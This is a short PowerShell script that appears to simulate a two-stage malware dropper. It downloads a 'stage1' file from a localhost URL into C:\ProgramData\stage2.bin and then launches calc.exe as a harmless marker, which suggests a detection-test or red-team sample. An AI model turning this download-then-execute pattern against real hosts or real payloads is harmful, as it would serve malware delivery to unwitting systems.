
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Stage1Url = "http://localhost:8081/stage1.ps1",
    [string]$Stage2Path = "C:\ProgramData\stage2.bin",
    [int]$TimeoutSec = 66
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$FetchResult = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $Stage2Path -TimeoutSec $TimeoutSec
if ($FetchResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
